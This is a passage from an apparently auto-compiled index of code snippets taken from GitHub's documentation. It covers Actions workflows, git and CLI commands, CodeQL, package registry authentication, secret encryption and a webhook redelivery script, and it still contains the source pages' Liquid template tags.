shell\nCODE:\n```\n> SSH host keys have successfully been rolled.\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variables in Legacy PowerShell\nDESCRIPTION: This YAML configuration demonstrates how to set an environment variable using PowerShell version 5.1 and below. The example showcases setting a path using `Out-File` with UTF-8 encoding to the `$env:GITHUB_PATH` file. Requires the `windows-latest` runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  legacy-powershell-example:\n    runs-on: windows-latest\n    steps:\n      - shell: powershell\n        run: |\n          \"mypath\" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append\n\n```\n\n----------------------------------------\n\nTITLE: Specifying Queries from a QLPack's Default Suite (YAML)\nDESCRIPTION: This YAML code snippet shows how to include the queries in the default suite of a named CodeQL pack in a query suite. A version can be specified and if not the most recent version of the pack is used. The qlpack instruction tells CodeQL to resolve queries in the default suite of the named pack.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n- qlpack: <qlpack-name>\n  version: ^x.y.z\n```\n\n----------------------------------------\n\nTITLE: Pulling Changes from a Remote Repository with Git\nDESCRIPTION: This snippet demonstrates the use of `git pull` to fetch and merge changes from a remote repository. It's a shortcut for `git fetch` followed by `git merge`. `REMOTE-NAME` specifies the remote repository and `BRANCH-NAME` specifies the branch to pull from.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/getting-changes-from-a-remote-repository.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ git pull REMOTE-NAME BRANCH-NAME\n# Grabs online updates and merges them with your local work\n```\n\n----------------------------------------\n\nTITLE: Using a Public JavaScript Action in GitHub Workflow (YAML)\nDESCRIPTION: This workflow demonstrates how to use a public JavaScript action.  It defines a job that runs on ubuntu-latest. The steps include using the `hello-world-javascript-action` action from a public repository and then printing the output from the action.  The action is referenced using `uses: octocat/hello-world-javascript-action@1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b` and accepts an input `who-to-greet`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\non: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      - name: Hello world action step\n        id: hello\n        uses: octocat/hello-world-javascript-action@1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b\n        with:\n          who-to-greet: 'Mona the Octocat'\n      # Use the output from the `hello` step\n      - name: Get the output time\n        run: echo \"The time was ${{ steps.hello.outputs.time }}\"\n```\n\n----------------------------------------\n\nTITLE: Setting authToken in .npmrc for npm registry auth (GHE)\nDESCRIPTION: This snippet demonstrates how to authenticate with the GitHub Packages npm registry by adding an authToken to the .npmrc file.  The token is used to authenticate requests to the registry.  The `HOSTNAME` is a placeholder for your GitHub Enterprise Server's hostname and `TOKEN` is the Personal Access Token.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n//HOSTNAME/_registry/npm/:_authToken=TOKEN\n```\n\n----------------------------------------\n\nTITLE: Concurrency Configuration YAML\nDESCRIPTION: This YAML snippet demonstrates how to configure concurrency for a deployment workflow. It ensures only one job or workflow with the 'production' concurrency group runs at a time, pausing subsequent workflows with a 'pending' status if another is in progress and canceling any pending workflows in the same group. It applies at the workflow level.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-with-github-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Deployment\n\nconcurrency: production\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - name: deploy\n        # ...deployment-specific steps\n```\n\n----------------------------------------\n\nTITLE: Encrypting a secret using Node.js\nDESCRIPTION: This snippet demonstrates how to encrypt a secret using Node.js and the libsodium-wrappers library. It converts the secret and public key from Base64 to Uint8Array, encrypts the secret using `crypto_box_seal`, and converts the encrypted result back to Base64 for output. Requires the `libsodium-wrappers` package.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/encrypting-secrets-for-the-rest-api.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst sodium = require('libsodium-wrappers')\n\nconst secret = 'YOUR_SECRET'\nconst key = 'YOUR_BASE64_KEY'\n\n//Check if libsodium is ready and then proceed.\nsodium.ready.then(() => {\n  // Convert the secret and key to a Uint8Array.\n  let binkey = sodium.from_base64(key, sodium.base64_variants.ORIGINAL)\n  let binsec = sodium.from_string(secret)\n\n  // Encrypt the secret using libsodium\n  let encBytes = sodium.crypto_box_seal(binsec, binkey)\n\n  // Convert the encrypted Uint8Array to Base64\n  let output = sodium.to_base64(encBytes, sodium.base64_variants.ORIGINAL)\n\n  // Print the output\n  console.log(output)\n});\n```\n\n----------------------------------------\n\nTITLE: Caching with GitHub Actions\nDESCRIPTION: This snippet illustrates the GitHub Actions syntax for caching node modules using the `cache` action. It specifies the path to cache (~/.npm), a key based on the package-lock.json checksum, and a restore key for fallback.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Cache node modules\n  uses: {% data reusables.actions.action-cache %}\n  with:\n    path: ~/.npm\n    key: {% raw %}v1-npm-deps-${{ hashFiles('**/package-lock.json') }}{% endraw %}\n    restore-keys: v1-npm-deps-\n```\n\n----------------------------------------\n\nTITLE: Loading Client Credentials in Ruby\nDESCRIPTION: This snippet retrieves the GitHub application's client ID and client secret from environment variables using `ENV.fetch`. These credentials are required for the OAuth flow to authenticate users and exchange authorization codes for access tokens. Ensure that CLIENT_ID and CLIENT_SECRET are properly defined in your .env file.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nCLIENT_ID = ENV.fetch(\"CLIENT_ID\")\nCLIENT_SECRET = ENV.fetch(\"CLIENT_SECRET\")\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for Python Deployment to Azure\nDESCRIPTION: This workflow automates the build and deployment of a Python project to Azure App Service. It defines environment variables for the Azure web app name and Python version. The workflow triggers on pushes to the `main` branch, builds the application, installs dependencies, and deploys it to Azure using the `azure/webapps-deploy` action.  It uses artifact uploading and downloading between build and deploy jobs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-python-to-azure-app-service.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Build and deploy Python app to Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  PYTHON_VERSION: '3.8'               # set this to the Python version to use\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - name: Set up Python version\n        uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: {% raw %}${{ env.PYTHON_VERSION }}{% endraw %}\n\n      - name: Create and start virtual environment\n        run: |\n          python -m venv venv\n          source venv/bin/activate\n\n      - name: Set up dependency caching for faster installs\n        uses: {% data reusables.actions.action-cache %}\n        with:\n          path: ~/.cache/pip\n          key: {% raw %}${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}{% endraw %}\n          restore-keys: |\n            {% raw %}${{ runner.os }}-pip-{% endraw %}\n\n      - name: Install dependencies\n        run: pip install -r requirements.txt\n\n      # Optional: Add a step to run tests here (PyTest, Django test suites, etc.)\n\n      - name: Upload artifact for deployment jobs\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: python-app\n          path: |\n            .\n            !venv/\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: {% raw %}${{ steps.deploy-to-webapp.outputs.webapp-url }}{% endraw %}\n\n    steps:\n      - name: Download artifact from build job\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: python-app\n          path: .\n\n      - name: 'Deploy to Azure Web App'\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: {% raw %}${{ env.AZURE_WEBAPP_NAME }}{% endraw %}\n          publish-profile: {% raw %}${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Mirroring a Git Repository - Shell\nDESCRIPTION: Pushes a locally cloned Git repository to a remote repository on GitHub, mirroring all references (branches, tags, etc.). Requires Git to be installed, a local bare clone of the repository, and authentication set up for the GitHub repository.  The destination repository URL includes the GitHub username and repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-an-external-git-repository-using-the-command-line.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ cd REPO.git\n$ git push --mirror https://{% data variables.product.product_url %}/USER/REPO.git\n# Pushes the mirror to the new repository on {% data variables.location.product_location %}\n```\n\n----------------------------------------\n\nTITLE: Using Matrix Strategy with Reusable Workflow - YAML\nDESCRIPTION: This YAML snippet demonstrates how to use a matrix strategy when calling a reusable workflow.  The `matrix` key defines variables (in this case, `target`) with a list of values.  The `uses` key specifies the reusable workflow to call. The `with` key passes the current `matrix.target` to the workflow input `target`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  ReuseableMatrixJobForDeployment:\n    strategy:\n      matrix:\n        target: [dev, stage, prod]\n    uses: octocat/octo-repo/.github/workflows/deployment.yml@main\n    with:\n      target: ${{ matrix.target }}\n```\n\n----------------------------------------\n\nTITLE: Conditional Step Execution with `if` (YAML)\nDESCRIPTION: This example shows how to conditionally execute a step in a GitHub Actions workflow using the `if` keyword. The step will only run if the specified condition is met.  It showcases usage with event contexts and status check functions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - run: echo This event is a pull request that had an assignee removed.\n    if: {% raw %}${{ github.event_name == 'pull_request' && github.event.action == 'unassigned' }}{% endraw %}\n```\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: My first step\n    uses: octo-org/action-name@main\n  - name: My backup step\n    if: {% raw %}${{ failure() }}{% endraw %}\n    uses: actions/heroku@1.0.0\n```\n\n----------------------------------------\n\nTITLE: Python Workflow using Matrix Strategy for Multiple Python Versions\nDESCRIPTION: This workflow demonstrates using a matrix strategy to run the build job with multiple Python versions (pypy3.10, 3.9, 3.10, 3.11, 3.12, 3.13).  It checks out the code, sets up the specified Python version using the `setup-python` action, and prints the Python version to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python-version: [\"pypy3.10\", \"3.9\", \"3.10\", \"3.11\", \"3.12\", \"3.13\"]\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Python {% raw %}${{ matrix.python-version }}{% endraw %}\n        uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: {% raw %}${{ matrix.python-version }}{% endraw %}\n      # You can test your matrix by printing the current Python version\n      - name: Display Python version\n        run: python -c \"import sys; print(sys.version)\"\n```\n\n----------------------------------------\n\nTITLE: Iterative File Path Name Example in Azure Pipelines YAML\nDESCRIPTION: This YAML snippet demonstrates how to use an iterative expression (`each`) to dynamically include multiple templates based on a list of steps provided as a parameter.  The templates are named using the step names.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\nparameters:\n- name: steps\n  type: object\n  default:\n  - build_step\n  - release_step\nsteps:\n- {% raw %}${{ each step in parameters.steps }}{% endraw %}:\n    - template: \"${{ step }}-variables.yml\"\n```\n\n----------------------------------------\n\nTITLE: Caching Rust Dependencies\nDESCRIPTION: This workflow caches Rust dependencies to speed up subsequent workflow runs. It uses the `cache` action to cache the cargo registry, git dependencies, and the target directory based on the Cargo.lock file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n      - name: Cache\n        uses: {% data reusables.actions.action-cache %}\n        with:\n          path: |\n            ~/.cargo/registry\n            ~/.cargo/git\n            target\n          key: {% raw %}${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for Maven Central Publishing (YAML)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that publishes a Java package to the Maven Central Repository. The workflow is triggered on `release` events of type `created`. It sets up Java and Gradle, then executes the `gradle publish` command, passing in Maven credentials as environment variables retrieved from GitHub secrets.  It depends on the `action-checkout`, `action-setup-java`, and `gradle/actions/setup-gradle` actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-gradle.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Publish package to the Maven Central Repository\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Java\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n\n      - name: Setup Gradle\n        uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n      - name: Publish package\n        run: ./gradlew publish\n        env:\n          MAVEN_USERNAME: {% raw %}${{ secrets.OSSRH_USERNAME }}{% endraw %}\n          MAVEN_PASSWORD: {% raw %}${{ secrets.OSSRH_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Uploading SARIF Results to GitHub using CodeQL CLI\nDESCRIPTION: This command uses the CodeQL CLI to upload a SARIF file containing diagnostic information to GitHub. The `--repository`, `--ref`, `--commit`, and `--sarif` parameters specify the repository, Git ref, commit SHA, and SARIF file path, respectively. The `--github-url` parameter is conditionally included for GitHub Enterprise Server instances. The result is making the diagnostics available on the tool status page.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/uploading-codeql-analysis-results-to-github.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql github upload-results \\\n    --repository=my-org/example-repo \\\n    --ref=refs/heads/main --commit=deb275d2d5fe9a522a0b7bd8b6b6a1c939552718 \\\n    --sarif=/temp/example-repo-js.sarif {% ifversion ghes %}--github-url=https://HOSTNAME \\\n    {% endif %}\n```\n\n----------------------------------------\n\nTITLE: Configuring Steps (Runner Jobs) - YAML\nDESCRIPTION: This YAML snippet configures the steps for a GitHub Actions workflow job running directly on the runner machine. It checks out the repository code, installs dependencies using `npm ci`, and connects to the PostgreSQL service. The `Connect to PostgreSQL` step executes the `node client.js` script, using environment variables (`POSTGRES_HOST` set to `localhost` and `POSTGRES_PORT`) to connect to the PostgreSQL service exposed on the host.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: {% data reusables.actions.action-checkout %}\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to PostgreSQL\n    # Runs a script that creates a PostgreSQL table, populates\n    # the table with data, and then retrieves the data\n    run: node client.js\n    # Environment variables used by the `client.js` script to create\n    # a new PostgreSQL table.\n    env:\n      # The hostname used to communicate with the PostgreSQL service container\n      POSTGRES_HOST: localhost\n      # The default PostgreSQL port\n      POSTGRES_PORT: 5432\n```\n\n----------------------------------------\n\nTITLE: Example Pester Test Script (PowerShell)\nDESCRIPTION: This PowerShell snippet provides an example of a Pester test script (`Unit.Tests.ps1`) that checks if a file named `resultsfile.log` exists. It uses the `Describe` and `It` blocks to structure the test and the `Test-Path` cmdlet combined with `Should -Be $true` to assert the expected result.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-powershell.md#_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nDescribe \"Check results file is present\" {\n    It \"Check results file is present\" {\n        Test-Path resultsfile.log | Should -Be $true\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Fetching Updates from a Remote Repository with Git\nDESCRIPTION: This command fetches updates and branches from a remote repository.  It utilizes the remote name previously configured with `git remote add` (e.g., `upstream`).  This retrieves the latest changes without merging them into the local branch.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/pushing-commits-to-a-remote-repository.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit fetch upstream\n```\n\n----------------------------------------\n\nTITLE: Example Build and Publishing (github.com)\nDESCRIPTION: This example demonstrates how to build a new image and push it to the github.com GitHub Packages registry.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\n# Build the image with docker.pkg.github.com/OWNER/REPOSITORY/IMAGE_NAME:VERSION\n# Assumes Dockerfile resides in the current working directory (.)\n$ docker build -t docker.pkg.github.com/octocat/octo-app/monalisa:1.0 .\n\n# Push the image to {% data variables.product.prodname_registry %}\n$ docker push docker.pkg.github.com/octocat/octo-app/monalisa:1.0\n```\n\n----------------------------------------\n\nTITLE: Tagging the Release\nDESCRIPTION: Creates a tag named `v1` for the current release and pushes the tag to the remote repository. Tagging is essential for version control and allows workflows to reference specific versions of the action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ngit tag -a -m \"Description of this release\" v1\ngit push --follow-tags\n```\n\n----------------------------------------\n\nTITLE: Transferring an issue using GitHub CLI\nDESCRIPTION: This snippet shows how to transfer an issue to another repository using the `gh issue transfer` command in the GitHub CLI. It requires the issue number or URL and the target repository's name (or URL for GitHub Enterprise Server).  The user must have the GitHub CLI installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/administering-issues/transferring-an-issue-to-another-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh issue transfer ISSUE {% ifversion ghes %}HOSTNAME/{% endif %}OWNER/REPO\n```\n\n----------------------------------------\n\nTITLE: Promoting a GHES Replica Node to Primary\nDESCRIPTION: This command disables replication on a replica node and converts it to a primary node. It uses the same settings as the original primary. All replication services are enabled after the promotion.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_73\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-promote\n```\n\n----------------------------------------\n\nTITLE: Example Configuration Command Output\nDESCRIPTION: This demonstrates the expected output of the `gh actions-importer configure` command, including the prompts and user inputs for setting up the required credentials and configurations for GitHub and CircleCI.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ gh actions-importer configure\n✔ Which CI providers are you configuring?: CircleCI\nEnter the following values (leave empty to omit):\n✔ {% data variables.product.pat_generic_caps %} for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ {% data variables.product.pat_generic_caps %} for CircleCI: ********************\n✔ Base url of the CircleCI instance: https://circleci.com\n✔ CircleCI organization name: mycircleciorganization\nEnvironment variables successfully updated.\n```\n\n----------------------------------------\n\nTITLE: Requesting JWT using environment variables (YAML)\nDESCRIPTION: This YAML snippet shows how to retrieve the `ACTIONS_RUNTIME_TOKEN` and `ACTIONS_ID_TOKEN_REQUEST_URL` environment variables within a GitHub Actions workflow. It uses `actions/github-script` to access these environment variables and set them as outputs.  `debug: true` enables debugging output for the script step.  `timeout-minutes: 10` specifies the script execution timeout.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: {% data reusables.actions.action-github-script %}\n      id: script\n      timeout-minutes: 10\n      with:\n        debug: true\n        script: |\n          const token = process.env['ACTIONS_RUNTIME_TOKEN']\n          const runtimeUrl = process.env['ACTIONS_ID_TOKEN_REQUEST_URL']\n          core.setOutput('TOKEN', token.trim())\n          core.setOutput('IDTOKENURL', runtimeUrl.trim())\n```\n\n----------------------------------------\n\nTITLE: Redelivering Failed Webhooks with Octokit in JavaScript\nDESCRIPTION: This script uses Octokit SDK to retrieve failed webhook deliveries and redeliver them. It fetches environment variables such as repository owner, name, hook ID, and authentication token. It then paginates through webhook deliveries, identifies failed deliveries based on GUID, and redelivers them. Finally, it updates a configuration variable with the timestamp of the current run.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/automatically-redelivering-failed-deliveries-for-a-repository-webhook.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// This script uses {% data variables.product.company_short %}'s Octokit SDK to make API requests. For more information, see [AUTOTITLE](/rest/guides/scripting-with-the-rest-api-and-javascript).\nconst { Octokit } = require(\"octokit\");\n\n//\nasync function checkAndRedeliverWebhooks() {\n  // Get the values of environment variables that were set by the {% data variables.product.prodname_actions %} workflow.\n  const TOKEN = process.env.TOKEN;\n  const REPO_OWNER = process.env.REPO_OWNER;\n  const REPO_NAME = process.env.REPO_NAME;\n  const HOOK_ID = process.env.HOOK_ID;\n  const LAST_REDELIVERY_VARIABLE_NAME = process.env.LAST_REDELIVERY_VARIABLE_NAME;\n  {% ifversion ghes %}const HOSTNAME = process.env.HOSTNAME;{% endif %}\n  const WORKFLOW_REPO_NAME = process.env.WORKFLOW_REPO_NAME;\n  const WORKFLOW_REPO_OWNER = process.env.WORKFLOW_REPO_OWNER;\n\n  // Create an instance of `Octokit` using the token{% ifversion ghes %} and hostname{% endif %} values that were set in the {% data variables.product.prodname_actions %} workflow.\n  const octokit = new Octokit({ {% ifversion ghes %}\n    baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n    auth: TOKEN,\n  });\n\n  try {\n    // Get the last time that this script ran from the configuration variable. If the variable is not defined, use the current time minus 24 hours.\n    const lastStoredRedeliveryTime = await getVariable({\n      variableName: LAST_REDELIVERY_VARIABLE_NAME,\n      repoOwner: WORKFLOW_REPO_OWNER,\n      repoName: WORKFLOW_REPO_NAME,\n      octokit,\n    });\n    const lastWebhookRedeliveryTime = lastStoredRedeliveryTime || (Date.now() - (24 * 60 * 60 * 1000)).toString();\n\n    // Record the time that this script started redelivering webhooks.\n    const newWebhookRedeliveryTime = Date.now().toString();\n\n    // Get the webhook deliveries that were delivered after `lastWebhookRedeliveryTime`.\n    const deliveries = await fetchWebhookDeliveriesSince({\n      lastWebhookRedeliveryTime,\n      repoOwner: REPO_OWNER,\n      repoName: REPO_NAME,\n      hookId: HOOK_ID,\n      octokit,\n    });\n\n    // Consolidate deliveries that have the same globally unique identifier (GUID). The GUID is constant across redeliveries of the same delivery.\n    let deliveriesByGuid = {};\n    for (const delivery of deliveries) {\n      deliveriesByGuid[delivery.guid]\n        ? deliveriesByGuid[delivery.guid].push(delivery)\n        : (deliveriesByGuid[delivery.guid] = [delivery]);\n    }\n\n    // For each GUID value, if no deliveries for that GUID have been successfully delivered within the time frame, get the delivery ID of one of the deliveries with that GUID.\n    //\n    // This will prevent duplicate redeliveries if a delivery has failed multiple times.\n    // This will also prevent redelivery of failed deliveries that have already been successfully redelivered.\n    let failedDeliveryIDs = [];\n    for (const guid in deliveriesByGuid) {\n      const deliveries = deliveriesByGuid[guid];\n      const anySucceeded = deliveries.some(\n        (delivery) => delivery.status === \"OK\"\n      );\n      if (!anySucceeded) {\n        failedDeliveryIDs.push(deliveries[0].id);\n      }\n    }\n\n    // Redeliver any failed deliveries.\n    for (const deliveryId of failedDeliveryIDs) {\n      await redeliverWebhook({\n        deliveryId,\n        repoOwner: REPO_OWNER,\n        repoName: REPO_NAME,\n        hookId: HOOK_ID,\n        octokit,\n      });\n    }\n\n    // Update the configuration variable (or create the variable if it doesn't already exist) to store the time that this script started.\n    // This value will be used next time this script runs.\n    await updateVariable({\n      variableName: LAST_REDELIVERY_VARIABLE_NAME,\n      value: newWebhookRedeliveryTime,\n      variableExists: Boolean(lastStoredRedeliveryTime),\n      repoOwner: WORKFLOW_REPO_OWNER,\n      repoName: WORKFLOW_REPO_NAME,\n      octokit,\n    });\n\n    // Log the number of redeliveries.\n    console.log(\n      `Redelivered ${\n        failedDeliveryIDs.length\n      } failed webhook deliveries out of ${\n        deliveries.length\n      } total deliveries since ${Date(lastWebhookRedeliveryTime)}.`\n    );\n  } catch (error) {\n    // If there was an error, log the error so that it appears in the workflow run log, then throw the error so that the workflow run registers as a failure.\n    if (error.response) {\n      console.error(\n        `Failed to check and redeliver webhooks: ${error.response.data.message}`\n      );\n    }\n    console.error(error);\n    throw(error);\n  }\n}\n\n// This function will fetch all of the webhook deliveries that were delivered since `lastWebhookRedeliveryTime`.\n// It uses the `octokit.paginate.iterator()` method to iterate through paginated results. For more information, see [AUTOTITLE](/rest/guides/scripting-with-the-rest-api-and-javascript#making-paginated-requests).\n//\n// If a page of results includes deliveries that occurred before `lastWebhookRedeliveryTime`,\n// it will store only the deliveries that occurred after `lastWebhookRedeliveryTime` and then stop.\n// Otherwise, it will store all of the deliveries from the page and request the next page.\nasync function fetchWebhookDeliveriesSince({\n  lastWebhookRedeliveryTime,\n  repoOwner,\n  repoName,\n  hookId,\n  octokit,\n}) {\n  const iterator = octokit.paginate.iterator(\n    \"GET /repos/{owner}/{repo}/hooks/{hook_id}/deliveries\",\n    {\n      owner: repoOwner,\n      repo: repoName,\n      hook_id: hookId,\n      per_page: 100,\n      headers: {\n        \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n      },\n    }\n  );\n\n  const deliveries = [];\n\n  for await (const { data } of iterator) {\n    const oldestDeliveryTimestamp = new Date(\n      data[data.length - 1].delivered_at\n    ).getTime();\n\n    if (oldestDeliveryTimestamp < lastWebhookRedeliveryTime) {\n      for (const delivery of data) {\n        if (\n          new Date(delivery.delivered_at).getTime() > lastWebhookRedeliveryTime\n        ) {\n          deliveries.push(delivery);\n        } else {\n          break;\n        }\n      }\n      break;\n    } else {\n      deliveries.push(...data);\n    }\n  }\n\n  return deliveries;\n}\n\n// This function will redeliver a failed webhook delivery.\nasync function redeliverWebhook({\n  deliveryId,\n  repoOwner,\n  repoName,\n  hookId,\n  octokit,\n}) {\n  await octokit.request(\n    \"POST /repos/{owner}/{repo}/hooks/{hook_id}/deliveries/{delivery_id}/attempts\",\n    {\n      owner: repoOwner,\n      repo: repoName,\n      hook_id: hookId,\n      delivery_id: deliveryId,\n    }\n  );\n}\n\n// This function gets the value of a configuration variable.\n// If the variable does not exist, the endpoint returns a 404 response and this function returns `undefined`.\nasync function getVariable({ variableName, repoOwner, repoName, octokit }) {\n  try {\n    const {\n      data: { value },\n    } = await octokit.request(\n      \"GET /repos/{owner}/{repo}/actions/variables/{name}\",\n      {\n        owner: repoOwner,\n        repo: repoName,\n        name: variableName,\n      }\n    );\n    return value;\n  } catch (error) {\n    if (error.status === 404) {\n      return undefined;\n    } else {\n      throw error;\n    }\n  }\n}\n\n// This function will update a configuration variable (or create the variable if it doesn't already exist). For more information, see [AUTOTITLE](/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows).\nasync function updateVariable({\n  variableName,\n  value,\n  variableExists,\n  repoOwner,\n  repoName,\n  octokit,\n}) {\n  if (variableExists) {\n    await octokit.request(\n      \"PATCH /repos/{owner}/{repo}/actions/variables/{name}\",\n      {\n        owner: repoOwner,\n        repo: repoName,\n        name: variableName,\n        value: value,\n      }\n    );\n  } else {\n    await octokit.request(\"POST /repos/{owner}/{repo}/actions/variables\", {\n      owner: repoOwner,\n      repo: repoName,\n      name: variableName,\n      value: value,\n    });\n  }\n}\n\n// This will execute the `checkAndRedeliverWebhooks` function.\n(async () => {\n  await checkAndRedeliverWebhooks();\n})();\n\n```\n\n----------------------------------------\n\nTITLE: Reusable Workflow Input Parameters - YAML\nDESCRIPTION: This example shows how to call a reusable workflow and pass input parameters to it using the `with` keyword. The `username` input is passed to the `called-workflow.yml` 